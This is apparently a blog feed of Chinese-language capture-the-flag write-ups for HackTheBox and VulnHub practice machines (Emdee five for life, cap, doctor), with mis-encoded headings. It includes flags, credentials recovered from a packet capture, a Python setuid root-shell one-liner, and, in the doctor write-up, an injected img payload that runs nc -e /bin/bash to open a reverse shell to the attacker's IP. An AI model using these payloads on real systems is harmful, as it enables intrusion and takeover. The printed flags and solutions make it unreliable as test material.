whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">thisistheflag.txt</span></span><br><span class="line"><span class="string"># cat thisistheflag.txt</span></span><br><span class="line"><span class="string">cat /root/thisistheflag.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">888b    888 d8b                                                      888      888 888 888</span></span><br><span class="line"><span class="string">8888b   888 Y8P                                                      888      888 888 888</span></span><br><span class="line"><span class="string">88888b  888                                                          888      888 888 888</span></span><br><span class="line"><span class="string">888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888</span></span><br><span class="line"><span class="string">888 Y88b888 888 d88P&quot;   d8P  Y8b      888  888  888 d88&quot;&quot;88b 888P&quot;   888 .88P 888 888 888</span></span><br><span class="line"><span class="string">888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P</span></span><br><span class="line"><span class="string">888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 &quot;88b  &quot;   &quot;   &quot;</span></span><br><span class="line"><span class="string">888    Y888 888  &quot;Y8888P &quot;Y8888        &quot;Y8888888P&quot;   &quot;Y88P&quot;  888     888  888 888 888 888</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Once again, a big thanks to all those who do these little challenges,</span></span><br><span class="line"><span class="string">and especially all those who give me feedback - again, it&#x27;</span>s all greatly</span><br><span class="line">appreciated.  :-)</span><br><span class="line"></span><br><span class="line">I also want to send a big thanks to all those who find the vulnerabilities</span><br><span class="line">and create the exploits that make these challenges possible.</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>vulnhub</category>
        <category>DC</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-[Emdee_five_for_life]</title>
    <url>/2020/09/18/Emdee-five-for-life/</url>
    <content><![CDATA[<h2 id="Emdee-five-for-life"><a href="#Emdee-five-for-life" class="headerlink" title="Emdee five for life"></a><span class="exturl" data-url="aHR0cHM6Ly9hcHAuaGFja3RoZWJveC5ldS9jaGFsbGVuZ2VzLzY3">Emdee five for life<i class="fa fa-external-link-alt"></i></span></h2><a id="more"></a>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/emdee<span class="comment"># cat ctf.py </span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url=<span class="string">&quot;http://docker.hackthebox.eu:31569/&quot;</span></span><br><span class="line">r=requests.session()</span><br><span class="line">out=r.get(url)</span><br><span class="line">outl=re.search(<span class="string">r&quot;&lt;h3 align=&#x27;center&#x27;&gt;(\w*)&lt;/h3&gt;&quot;</span>,out.text)</span><br><span class="line">outll=hashlib.md5(outl.group(<span class="number">1</span>).encode(<span class="string">&#x27;utf8&#x27;</span>)).hexdigest()</span><br><span class="line">print(<span class="string">&quot;sending md5 : &#123;&#125;&quot;</span>.format(outll))</span><br><span class="line">data=&#123;<span class="string">&#x27;hash&#x27;</span>:outll&#125;</span><br><span class="line">out=r.post(url=url,data=data)</span><br><span class="line">print(out.text)</span><br><span class="line">root@JIYE:~/htb/emdee<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/emdee<span class="comment"># python3 ctf.py </span></span><br><span class="line">sending md5 : d92889d19659d8095201121281d6e98b</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;emdee five for life&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body style=<span class="string">&quot;background-color:powderblue;&quot;</span>&gt;</span><br><span class="line">&lt;h1 align=&#x27;center&#x27;&gt;MD5 encrypt this string&lt;/h1&gt;&lt;h3 align=&#x27;center&#x27;&gt;xcx4vl6glkWdxhQePelZ&lt;/h3&gt;&lt;p align=&#x27;center&#x27;&gt;HTB&#123;N1c3_ScrIpt1nG_B0i!&#125;&lt;/p&gt;&lt;center&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;hash&quot; placeholder=&quot;MD5&quot; align=&#x27;center&#x27;&gt;&lt;/input&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;/input&gt;</span><br><span class="line">&lt;/form&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/emdee<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">HTB&#123;N1c3_ScrIpt1nG_B0i!&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-[cap]</title>
    <url>/2021/07/14/HTB-cap/</url>
    <content><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><img src="/2021/07/14/HTB-cap/image-20210714122750156.png" class>

<a id="more"></a>

<h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†21ã€21ã€80ç«¯å£</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/cap]</span><br><span class="line">â””â”€# ftp anonymous@10.10.10.245                                                                                                                             1 âš™</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-14 00:34 EDT</span><br><span class="line">Nmap scan report for 10.10.10.245</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 992 closed ports</span><br><span class="line">PORT     STATE    SERVICE        VERSION</span><br><span class="line">21/tcp   open     ftp            vsftpd 3.0.3</span><br><span class="line">22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)</span><br><span class="line">|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)</span><br><span class="line">|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)</span><br><span class="line">80/tcp   open     http           gunicorn</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Content-Length: 193</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;title&gt;Bad Request&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;</span><br><span class="line">|     Invalid Request Line &amp;#x27;Invalid HTTP request line: &amp;#x27;&amp;#x27;&amp;#x27;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|     &lt;/html&gt;</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Server: gunicorn</span><br><span class="line">|     Date: Wed, 14 Jul 2021 04:39:13 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 19386</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html class=&quot;no-js&quot; lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Security Dashboard&lt;/title&gt;</span><br><span class="line">|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;shortcut icon&quot; type=&quot;image/png&quot; href=&quot;/static/images/icon/favicon.ico&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/bootstrap.min.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/font-awesome.min.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/themify-icons.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/metisMenu.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/owl.carousel.min.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/slicknav.min.css&quot;&gt;</span><br><span class="line">|     &lt;!-- amchar</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Server: gunicorn</span><br><span class="line">|     Date: Wed, 14 Jul 2021 04:39:14 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Allow: GET, HEAD, OPTIONS</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|   RTSPRequest: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Content-Length: 196</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;title&gt;Bad Request&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;</span><br><span class="line">|     Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP/1.0&amp;#x27;&amp;#x27;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|_    &lt;/html&gt;</span><br><span class="line">|_http-server-header: gunicorn</span><br><span class="line">|_http-title: Security Dashboard</span><br><span class="line">1117/tcp filtered ardus-mtrns</span><br><span class="line">3371/tcp filtered satvid-datalnk</span><br><span class="line">5822/tcp filtered unknown</span><br><span class="line">5952/tcp filtered unknown</span><br><span class="line">8652/tcp filtered unknown</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port80-TCP:V=7.91%I=7%D=7/14%Time=60EE6988%P=x86_64-pc-linux-gnu%r(GetR</span><br><span class="line">SF:equest,1059,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20</span><br><span class="line">SF:Wed,\x2014\x20Jul\x202021\x2004:39:13\x20GMT\r\nConnection:\x20close\r\</span><br><span class="line">SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20193</span><br><span class="line">SF:86\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20class=\&quot;no-js\&quot;\x20lang=\&quot;en\&quot;&gt;\</span><br><span class="line">SF:n\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x2</span><br><span class="line">SF:0&lt;meta\x20http-equiv=\&quot;x-ua-compatible\&quot;\x20content=\&quot;ie=edge\&quot;&gt;\n\x20\</span><br><span class="line">SF:x20\x20\x20&lt;title&gt;Security\x20Dashboard&lt;/title&gt;\n\x20\x20\x20\x20&lt;meta\</span><br><span class="line">SF:x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20initial-scale=</span><br><span class="line">SF:1\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;shortcut\x20icon\&quot;\x20type=\&quot;image</span><br><span class="line">SF:/png\&quot;\x20href=\&quot;/static/images/icon/favicon\.ico\&quot;&gt;\n\x20\x20\x20\x20&lt;</span><br><span class="line">SF:link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/bootstrap\.min\.css\&quot;&gt;</span><br><span class="line">SF:\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/fon</span><br><span class="line">SF:t-awesome\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20</span><br><span class="line">SF:href=\&quot;/static/css/themify-icons\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=</span><br><span class="line">SF:\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/metisMenu\.css\&quot;&gt;\n\x20\x20\x20\x2</span><br><span class="line">SF:0&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/owl\.carousel\.min\.</span><br><span class="line">SF:css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/c</span><br><span class="line">SF:ss/slicknav\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;!--\x20amchar&quot;)%r(HTTPOption</span><br><span class="line">SF:s,B3,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Wed,\x2</span><br><span class="line">SF:014\x20Jul\x202021\x2004:39:14\x20GMT\r\nConnection:\x20close\r\nConten</span><br><span class="line">SF:t-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20HEAD,\x20OP</span><br><span class="line">SF:TIONS\r\nContent-Length:\x200\r\n\r\n&quot;)%r(RTSPRequest,121,&quot;HTTP/1\.1\x2</span><br><span class="line">SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text</span><br><span class="line">SF:/html\r\nContent-Length:\x20196\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;\n\x20\x20</span><br><span class="line">SF:\x20\x20&lt;title&gt;Bad\x20Request&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;body&gt;\</span><br><span class="line">SF:n\x20\x20\x20\x20&lt;h1&gt;&lt;p&gt;Bad\x20Request&lt;/p&gt;&lt;/h1&gt;\n\x20\x20\x20\x20Invali</span><br><span class="line">SF:d\x20HTTP\x20Version\x20&amp;#x27;Invalid\x20HTTP\x20Version:\x20&amp;#x27;RTSP</span><br><span class="line">SF:/1\.0&amp;#x27;&amp;#x27;\n\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(GenericLines,11E,&quot;HTT</span><br><span class="line">SF:P/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type</span><br><span class="line">SF::\x20text/html\r\nContent-Length:\x20193\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;\</span><br><span class="line">SF:n\x20\x20\x20\x20&lt;title&gt;Bad\x20Request&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x</span><br><span class="line">SF:20&lt;body&gt;\n\x20\x20\x20\x20&lt;h1&gt;&lt;p&gt;Bad\x20Request&lt;/p&gt;&lt;/h1&gt;\n\x20\x20\x20\</span><br><span class="line">SF:x20Invalid\x20Request\x20Line\x20&amp;#x27;Invalid\x20HTTP\x20request\x20li</span><br><span class="line">SF:ne:\x20&amp;#x27;&amp;#x27;&amp;#x27;\n\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;);</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 221.16 seconds</span><br></pre></td></tr></table></figure>

<h2 id="0x02-FTPåŒ¿åè®¿é—®"><a href="#0x02-FTPåŒ¿åè®¿é—®" class="headerlink" title="0x02.FTPåŒ¿åè®¿é—®"></a>0x02.FTPåŒ¿åè®¿é—®</h2><p><code>ç”±äºå¼€æ”¾äº†21ç«¯å£ï¼Œæ‰€ä»¥å°è¯•åŒ¿åç™»å…¥ï¼Œå¯ä»¥çœ‹åˆ°ä¸å…è®¸åŒ¿åç™»å…¥</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/cap]</span><br><span class="line">â””â”€# ftp anonymous@10.10.10.245                                                                                                                             1 âš™</span><br><span class="line">ftp: anonymous@10.10.10.245: Name or service not known</span><br><span class="line"><span class="meta">ftp&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="0x03-è®¿é—®80ç«¯å£"><a href="#0x03-è®¿é—®80ç«¯å£" class="headerlink" title="0x03.è®¿é—®80ç«¯å£"></a>0x03.è®¿é—®80ç«¯å£</h2><p><code>æ‰‹åŠ¨çˆ¬è™«å‘ç°è¿™æ˜¯ä¸€ä¸ªç½‘ç»œè®¾å¤‡ç®¡ç†é¢æ¿</code></p>
<img src="/2021/07/14/HTB-cap/image-20210714131548126.png" class>

<p><code>å¤šæ¬¡ç‚¹å‡»å‘ç°urlä¹Ÿä¼šå‘ç”Ÿå˜åŒ–ï¼Œä¸”å¯ä»¥ä¸‹è½½æ•°æ®åŒ…</code></p>
<img src="/2021/07/14/HTB-cap/image-20210714131753971.png" class>

<img src="/2021/07/14/HTB-cap/image-20210714131753971.png" class>

<p><code>æ‰«ædataç›®å½•ï¼Œè®¿é—®å‘ç°ä¸€å…±æœ‰6ä¸ªæœ‰æ•ˆé“¾æ¥ï¼Œåˆ†åˆ«æ˜¯0ã€1ã€2ã€3ã€4ã€5ï¼Œå…¨éƒ¨ä¸‹è½½</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”€â”€(rootğŸ’€kali)-[~/htb/cap]</span><br><span class="line">â””â”€# dirb http://10.10.10.245/data/                                                                                                                         1 âš™</span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line">START_TIME: Wed Jul 14 01:10:25 2021</span><br><span class="line">URL_BASE: http://10.10.10.245/data/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">-----------------</span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line">---- Scanning URL: http://10.10.10.245/data/ ----</span><br><span class="line">+ http://10.10.10.245/data/0 (CODE:200|SIZE:17147)</span><br><span class="line">+ http://10.10.10.245/data/00 (CODE:200|SIZE:17147) </span><br><span class="line">+ http://10.10.10.245/data/01 (CODE:200|SIZE:17144) </span><br><span class="line">+ http://10.10.10.245/data/02 (CODE:200|SIZE:17144)</span><br><span class="line">+ http://10.10.10.245/data/03 (CODE:200|SIZE:17144)                                                   </span><br><span class="line">+ http://10.10.10.245/data/04 (CODE:200|SIZE:17144)                                                     </span><br><span class="line">+ http://10.10.10.245/data/05 (CODE:200|SIZE:17147)                                                   </span><br><span class="line">+ http://10.10.10.245/data/1 (CODE:200|SIZE:17144)                                                      </span><br><span class="line">+ http://10.10.10.245/data/2 (CODE:200|SIZE:17144)                                                       </span><br><span class="line">+ http://10.10.10.245/data/3 (CODE:200|SIZE:17144)                                                       </span><br><span class="line">+ http://10.10.10.245/data/4 (CODE:200|SIZE:17144)                                                       + http://10.10.10.245/data/5 (CODE:200|SIZE:17147)</span><br></pre></td></tr></table></figure>

<img src="/2021/07/14/HTB-cap/image-20210714132457089.png" class>

<h2 id="0x04-æ•°æ®åŒ…åˆ†æ"><a href="#0x04-æ•°æ®åŒ…åˆ†æ" class="headerlink" title="0x04.æ•°æ®åŒ…åˆ†æ"></a>0x04.æ•°æ®åŒ…åˆ†æ</h2><p><code>6ä¸ªæ•°æ®åŒ…ä¸­åªæœ‰0.pcapåŒ…å«æœ‰ç”¨ä¿¡æ¯ï¼Œå¾—åˆ°ç”¨æˆ·ä¸å¯†ç </code></p>
<blockquote>
<p>user:nathan</p>
<p>pass:Buck3tH4TF0RM3!</p>
</blockquote>
<img src="/2021/07/14/HTB-cap/image-20210714140327176.png" class>

<p><code>ç™»å…¥å¾—åˆ°flag</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# ssh nathan@10.10.10.245                                                                                                                                1 âš™</span><br><span class="line">nathan@10.10.10.245&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-73-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Wed Jul 14 06:11:21 UTC 2021</span><br><span class="line"></span><br><span class="line">  System load:           0.04</span><br><span class="line">  Usage of /:            35.0% of 8.73GB</span><br><span class="line">  Memory usage:          21%</span><br><span class="line">  Swap usage:            0%</span><br><span class="line">  Processes:             228</span><br><span class="line">  Users logged in:       0</span><br><span class="line">  IPv4 address for eth0: 10.10.10.245</span><br><span class="line">  IPv6 address for eth0: dead:beef::250:56ff:feb9:dda9</span><br><span class="line"></span><br><span class="line">  =&gt; There are 4 zombie processes.</span><br><span class="line"></span><br><span class="line"> * Super-optimized for small spaces - read how we shrank the memory</span><br><span class="line">   footprint of MicroK8s to make it the smallest full K8s around.</span><br><span class="line"></span><br><span class="line">   https://ubuntu.com/blog/microk8s-memory-optimisation</span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check for new updates run: sudo apt update</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">nathan@cap:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">nathan@cap:~$ cat user.txt </span><br><span class="line">*************************</span><br><span class="line">nathan@cap:~$</span><br></pre></td></tr></table></figure>

<h2 id="0x05-ææƒ"><a href="#0x05-ææƒ" class="headerlink" title="0x05.ææƒ"></a>0x05.ææƒ</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nathan@cap:~$ python3 -c &#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash"> /bin/bash</span></span><br><span class="line">root@cap:~# cd /root</span><br><span class="line">root@cap:/root# ls</span><br><span class="line">root.txt  snap</span><br><span class="line">root@cap:/root# cat root.txt </span><br><span class="line">****************************</span><br><span class="line">root@cap:/root# </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-doctor</title>
    <url>/2020/10/18/HTB-doctor/</url>
    <content><![CDATA[<h2 id="0x00ç®€è¿°"><a href="#0x00ç®€è¿°" class="headerlink" title="0x00ç®€è¿°"></a>0x00ç®€è¿°</h2><img src="/2020/10/18/HTB-doctor/image-20201018151933161.png" class>

<a id="more"></a>

<h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†22/80/8089ç«¯å£ï¼Œ8089å¯¹åº”çš„æœåŠ¡ä¸ºsplunk</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/doctor# nmap -sC -sV -sT 10.10.10.209 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 03:21 EDT</span><br><span class="line">Nmap scan report for 10.10.10.209</span><br><span class="line">Host is up (0.35s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Doctor</span><br><span class="line">8089/tcp open  ssl/http Splunkd httpd</span><br><span class="line">| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser</span><br><span class="line">| Not valid before: 2020-09-06T15:57:27</span><br><span class="line">|_Not valid after:  2023-09-06T15:57:27</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 103.68 seconds</span><br><span class="line">root@JIYE:~/htb/doctor#</span><br></pre></td></tr></table></figure>

<h2 id="0x02-å…ˆè®¿é—®80ç«¯å£"><a href="#0x02-å…ˆè®¿é—®80ç«¯å£" class="headerlink" title="0x02.å…ˆè®¿é—®80ç«¯å£"></a>0x02.å…ˆè®¿é—®80ç«¯å£</h2><p><code>åŒæ ·çš„é…æ–¹åŒæ ·çš„å‘³é“ï¼Œæ·»åŠ ä¸€æ¡hosts  [doctors.htb    10.10.10.209]</code></p>
<img src="/2020/10/18/HTB-doctor/image-20201018152818636.png" class>

<h2 id="0x03-è®¿é—®doctors-htb"><a href="#0x03-è®¿é—®doctors-htb" class="headerlink" title="0x03.è®¿é—®doctors.htb"></a>0x03.è®¿é—®doctors.htb</h2><h3 id="1-å°è¯•ç®€å•æ³¨å…¥ï¼Œå¯æ˜¯æ²¡æœ‰ã€‚"><a href="#1-å°è¯•ç®€å•æ³¨å…¥ï¼Œå¯æ˜¯æ²¡æœ‰ã€‚" class="headerlink" title="1.å°è¯•ç®€å•æ³¨å…¥ï¼Œå¯æ˜¯æ²¡æœ‰ã€‚"></a>1.å°è¯•ç®€å•æ³¨å…¥ï¼Œå¯æ˜¯æ²¡æœ‰ã€‚</h3><img src="/2020/10/18/HTB-doctor/image-20201018154218860.png" class>

<h3 id="2-æ³¨å†Œç”¨æˆ·"><a href="#2-æ³¨å†Œç”¨æˆ·" class="headerlink" title="2.æ³¨å†Œç”¨æˆ·"></a>2.æ³¨å†Œç”¨æˆ·</h3><img src="/2020/10/18/HTB-doctor/image-20201018154351730.png" class>

<h3 id="3-ç™»å…¥"><a href="#3-ç™»å…¥" class="headerlink" title="3.ç™»å…¥"></a>3.ç™»å…¥</h3><img src="/2020/10/18/HTB-doctor/image-20201018154434150.png" class>

<h3 id="4-æ‰‹åŠ¨çˆ¬è™«"><a href="#4-æ‰‹åŠ¨çˆ¬è™«" class="headerlink" title="4.æ‰‹åŠ¨çˆ¬è™«"></a>4.æ‰‹åŠ¨çˆ¬è™«</h3><p><code>å‘ç°è€Œå·²æäº¤ç•™è¨€ï¼Œæ„Ÿè§‰åˆ°å­˜å‚¨å‹XSSçš„å‘³é“ã€‚ã€‚ã€‚</code></p>
<img src="/2020/10/18/HTB-doctor/image-20201018154824325.png" class>

<h3 id="5-æ„å»ºXSSä»£ç åå¼¹shell"><a href="#5-æ„å»ºXSSä»£ç åå¼¹shell" class="headerlink" title="5.æ„å»ºXSSä»£ç åå¼¹shell"></a>5.æ„å»ºXSSä»£ç åå¼¹shell</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://10.10.17.216/$(nc.traditional$IFS-e$IFS/bin/bash$IFS</span>&#x27;<span class="attr">10.10.17.216</span>&#x27;$<span class="attr">IFS</span>&#x27;<span class="attr">6666</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>kaliå…ˆç›‘å¬6666</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/doctor# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>æäº¤</code></p>
<img src="/2020/10/18/HTB-doctor/image-20201018155733291.png" class>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/doctor# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.209] 38714</span><br><span class="line">whoami</span><br><span class="line">web</span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">web@doctor:~$ </span><br></pre></td></tr></table></figure>

